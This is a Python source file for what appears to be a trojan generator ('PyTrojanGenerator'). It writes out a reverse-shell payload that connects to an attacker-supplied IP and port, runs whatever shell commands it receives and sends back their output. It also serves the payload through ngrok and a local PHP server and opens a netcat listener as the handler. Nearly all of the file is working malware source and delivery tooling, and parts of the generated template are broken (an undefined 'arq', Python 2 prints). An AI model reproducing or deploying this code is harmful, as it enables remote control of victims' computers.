#coding: utf-8
# Creator: Sam Junior
# v2018-1.0
import os, time, socket
from subprocess import call
from time import sleep
from os import geteuid, system, path
from sys import exit, argv, stdout
from platform import system as systemos, architecture
from wget import download
from banner import ban

def optionNgrok():
	option = str(input("\nDo you want put your Trojan into Ngrok Server ? (y/N): "))
	if option == 'y':
			print("[...] Processing ")
			checkNgrok()
			sleep(2)
			runCopy()
			sleep(1)
			runNgrok()
			sleep(3)
			runServer()
	else:
			print("Okay !")

def runCopy():
    system('sudo rm -Rf Server/www/*.* && sudo touch Server/www/cat.txt')
    nome = input("\n\033[01;34m[+]\033[0m"+" Trojan Name:  ")
    nome_completo = nome+'.py'
    system('sudo cp Output/%(nome_completo)s Server/www/' % locals())


def checkNgrok():
    if path.isfile('Server/ngrok') == False: 
        print ('[*] Downloading Ngrok...')
        ostype = systemos().lower()
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
        else:
            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')


def runNgrok():
    system('./Server/ngrok http 80 &gt; /dev/null &')
    sleep(10)
    #system('curl -s -N http://127.0.0.1:4040/status | grep &quot;https://[0-9a-z]*\.ngrok.io&quot; -oh &gt; ngrok.url')
    #url = open('ngrok.url', 'r')
   # print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
    #url.close()

def runServer():
    system("cd Server/www/ && sudo php -S 127.0.0.1:80")



def handler():
	port_handler = int(input("\n\033[1;32m[!]\033[m Port: "))
	system('sudo nc -vlp %(port_handler)s' % locals())



def criar():
	ngrok = input("\033[01;32m[!]\033[0m"+" Do you want use ngrok (y/N): ")

	if ngrok == "y":
		ip = input("\n\033[01;36m[%]\033[0m"+" Ngrok IP: ")
		porta = input("\n\033[01;36m[%]\033[0m"+" Ngrok Port: ")
		nome = input("\n\033[01;34m[+]\033[0m"+" Trojan Name: ")
		
		arquivo = open(nome+".py", "w")	
		
		print("\033[01;32m[...]\033[0m"+" Generating Python Trojan")
		
		arquivo.write("""#coding: utf-8

import socket
import time
import subprocess

ip = {}
port = {}


def connect(ip, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		s.send('\033[1;32m[!] Connection Received ')
		return s
	except Exception as e:
		print "Connection Error: ", e
		return None

def listen(s):
	try:
		while True:
			 data = s.recv(1024)
			 if data[0:-1] == 'exit':
				 s.close()
				 exit(0)
			 else:
				cmd(s, data[:-1])
	except:
		error(s)


def cmd(s, data):
		try:
			proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			saida = proc.stdout.read() + proc.stderr.read()
			s.send(saida+"")
		except:
			error(s)

def error(s):
    if s:    
        s.close()
    main2()


def main2():
	if s:
		s.close()
	while True:
		s_conectado = connect(ip, port)
		if s_conectado:
			listen(s_conectado)
		else:
			print "Connection Failed, Trying Again..."
			time.sleep(10)

s = None
main2()

arq.close()

os.system("python3 .handler.py &>> /dev/null")
		""".format('"{}"'.format(ip), porta))
	
		arquivo.close()

		nome_completo = nome+'.py'
		print("\n\033[01;32m[*]\033[0m"+" Trojan Generated! Saved as: Output/%(nome_completo)s" % locals())
		os.system('sudo mv %(nome_completo)s Output' % locals())



	else:
			ip = input("\n\033[01;34m[+]\033[0m"+" Your IP Address: ")
		
			porta = input("\n\033[01;34m[+]\033[0m"+" Port: ")
		
			nome = input("\n\033[01;34m[+]\033[0m"+" Trojan Name:  ")
			arquivo = open(nome+".py", "w")
		
			print("\n\033[01;32m[...]\033[0m"+"Generating Trojan ")
		
			arquivo.write("""#coding: utf-8
import socket
import time
import subprocess

ip = {}
port = {}


def connect(ip, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		s.send('\033[1;32m[!] Connection Received ')
		return s
	except Exception as e:
		print "Connection Error: ", e
		return None

def listen(s):
	try:
		while True:
			 data = s.recv(1024)
			 if data[0:-1] == 'exit':
				 s.close()
				 exit(0)
			 else:
				cmd(s, data[:-1])
	except:
		error(s)


def cmd(s, data):
		try:
			proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			saida = proc.stdout.read() + proc.stderr.read()
			s.send(saida+"")
		except:
			error(s)

def error(s):
    if s:    
        s.close()
    main2()


def main2():
	if s:
		s.close()
	while True:
		s_conectado = connect(ip, port)
		if s_conectado:
			listen(s_conectado)
		else:
			print "Connection Failed, Trying Again..."
			time.sleep(10)

s = None
main2()
	
arq.close()
	
os.system("python3 .handler.py &>> /dev/null")
		""".format('"{}"'.format(ip), porta))
				
			nome_completo = nome+'.py'
			print("\n\033[01;32m[*]\033[0m"+" Trojan Generated! Saved as: Output/%(nome_completo)s" % locals())
			os.system('sudo mv %(nome_completo)s Output' % locals())

		

def menu():
	print('''\033[01;31m
\033[0m
\033[01;34m{1}\033[0m Create
\033[01;34m{2}\033[0m Handler
\033[01;34m{3}\033[0m Exit
	''')

if not geteuid() == 0:
    exit('\n           \033[1;31m[!] PyTrojanGenerator must be run as root [!]\033[m\n')
RED, WHITE, YELLOW, CIANO, GREEN, END = '\033[91m', '\33[46m', '\33[93m', '\33[36m', '\033[1;32m', '\033[0m'
def message():
    call('clear', shell=True)

print(ban)
menu()
try:
		opc = int(input("\033[01;35m[?]\033[0m PyBckGen -> "))
		if opc == 1:
			criar()
			optionNgrok()
		elif opc == 2:
			handler()
		else:
			exit(0)
except ValueError:
		#menu()
		print("Failed")

flag = True


